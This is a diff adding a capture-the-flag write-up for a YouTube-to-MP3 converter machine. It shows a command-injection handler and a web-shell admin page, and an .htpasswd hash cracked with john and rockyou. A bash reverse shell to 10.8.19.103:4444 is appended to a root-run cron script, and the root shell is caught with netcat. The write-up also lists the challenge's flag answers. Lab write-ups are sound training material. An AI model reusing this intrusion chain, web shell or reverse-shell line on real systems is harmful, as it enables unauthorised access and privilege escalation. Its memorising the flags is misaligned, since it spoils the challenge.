@@ -164,3 +164,169 @@ if(!empty($_SERVER['HTTP_X_REQUESTED_WITH']) && strtolower($_SERVER['HTTP_X_REQU
    $descriptorspec = array(
       0 => array("pipe", "r"),  // stdin
       1 => array("pipe", "w"),  // stdout
+      2 => array("pipe", "w"),  // stderr
+   );
+
+   $process = proc_open($string, $descriptorspec, $pipes);
+   $stdout = stream_get_contents($pipes[1]);
+   fclose($pipes[1]);
+   $stderr = stream_get_contents($pipes[2]);
+   fclose($pipes[2]);
+   $ret = proc_close($process);
+   echo json_encode(array(
+      'status' => $ret, 
+      'errors' => $stderr,
+      'url_orginal'=>$yt_url, 
+      'output' => $stdout,
+      'result_url'=> '/tmp/downloads/'.$id . '.mp3', 
+   ));
+   die();
+}
+
+?>
+
+<html>
+   <head>
+      <script type="text/javascript" src="/js/jquery-3.5.0.min.js"></script>
+      <script type="text/javascript" src="/js/main.js"></script>
+      <link rel="stylesheet" type="text/css" href="/style.css">
+   </head>
+   <body>
+      <div id="container">
+         <div id="logos">
+            <img src="images/youtube.png" alt="Youtube to MP3" height="200" width="200" />
+            <img src="images/mp3-file.png" alt="Youtube to MP3" height="200" width="200" />
+         </div>
+         <h3>Convert My Video</h3>
+         <label for="ytid">Video ID:</label><input type="text" id="ytid" name="ytid">
+         <button type="button" id="convert">Convert!</button>
+         <span id="message"></span>
+      </div>
+   </body>
+
+www-data@dmv:/var/www/html$ cd admin
+cd admin
+www-data@dmv:/var/www/html/admin$ ls
+ls
+flag.txt  index.php
+www-data@dmv:/var/www/html/admin$ cat flag.txt
+cat flag.txt
+flag{0d8486a0c0c42503bb60ac77f4046ed7}
+www-data@dmv:/var/www/html/admin$ cat index.php
+cat index.php
+<?php
+  if (isset($_REQUEST['c'])) {
+      system($_REQUEST['c']);
+      echo "Done :)";
+  }
+?>
+
+<a href="/admin/?c=rm -rf /var/www/html/tmp/downloads">
+   <button>Clean Downloads</button>
+
+</a>www-data@dmv:/var/www/html/admin$ ls -lah
+ls -lah
+total 24K
+drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2020 .
+drwxr-xr-x 6 www-data www-data 4.0K Jun 22 17:33 ..
+-rw-r--r-- 1 www-data www-data   98 Apr 12  2020 .htaccess
+-rw-r--r-- 1 www-data www-data   49 Apr 12  2020 .htpasswd
+-rw-r--r-- 1 www-data www-data   39 Apr 12  2020 flag.txt
+-rw-rw-r-- 1 www-data www-data  202 Apr 12  2020 index.php
+www-data@dmv:/var/www/html/admin$ cat .htpasswd
+cat .htpasswd
+itsmeadmin:$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
+www-data@dmv:/var/www/html/admin$ cat .htaccess
+cat .htaccess
+AuthName "AdminArea"
+AuthType Basic
+AuthUserFile /var/www/html/admin/.htpasswd
+Require valid-user
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ nano hash_youtube
+                                                                                      
+┌──(witty㉿kali)-[~/Downloads]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_youtube 
+Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-long"
+Use the "--format=md5crypt-long" option to force loading these as that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+jessie           (?)     
+1g 0:00:00:00 DONE () 33.33g/s 12800p/s 12800c/s 12800C/s alyssa..michael1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ john --show hash_youtube 
+?:jessie
+
+1 password hash cracked, 0 left
+                                                                                      
+┌──(witty㉿kali)-[~/Downloads]
+└─$ cat hash_youtube 
+$apr1$tbcm2uwv$UP1ylvgp4.zLKxWj8mc6y/
+
+itsmeadmin:jessie
+
+http://10.10.22.221/admin/ 
+
+login
+
+http://10.10.22.221/admin/?c=id (backdoor)
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data) Done :)
+
+www-data@dmv:/var/www/html/admin$ cd /var/www/html/tmp/
+cd /var/www/html/tmp/
+www-data@dmv:/var/www/html/tmp$ ls
+ls
+clean.sh
+www-data@dmv:/var/www/html/tmp$ cat clean.sh
+cat clean.sh
+rm -rf downloads
+www-data@dmv:/var/www/html/tmp$ ls -lah
+ls -lah
+total 12K
+drwxr-xr-x 2 www-data www-data 4.0K Apr 12  2020 .
+drwxr-xr-x 6 www-data www-data 4.0K Jun 22 17:33 ..
+-rw-r--r-- 1 www-data www-data   17 Apr 12  2020 clean.sh
+
+www-data@dmv:/var/www/html/tmp$ echo "/bin/bash -i >& /dev/tcp/10.8.19.103/4444 0>&1" >> clean.sh
+<h -i >& /dev/tcp/10.8.19.103/4444 0>&1" >> clean.sh
+www-data@dmv:/var/www/html/tmp$ cat clean.sh
+cat clean.sh
+rm -rf downloads
+/bin/bash -i >& /dev/tcp/10.8.19.103/4444 0>&1
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 4444                                     
+listening on [any] 4444 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.22.221] 50724
+bash: cannot set terminal process group (1655): Inappropriate ioctl for device
+bash: no job control in this shell
+root@dmv:/var/www/html/tmp# cd /root
+cd /root
+root@dmv:~# ls
+ls
+root.txt
+root@dmv:~# cat root.txt
+cat root.txt
+flag{d9b368018e912b541a4eb68399c5e94a}
+```
+What is the name of the secret folder?
+*admin*
+What is the user to access the secret folder?
+*itsmeadmin*
+What is the user flag?
+What is the root flag?
+
+## Flags / Answers
+- ***flag{0d8486a0c0c42503bb60ac77f4046ed7}***
+- ***flag{d9b368018e912b541a4eb68399c5e94a}***
+
+## Notes / Lessons Learned
+[[Templates]]
+
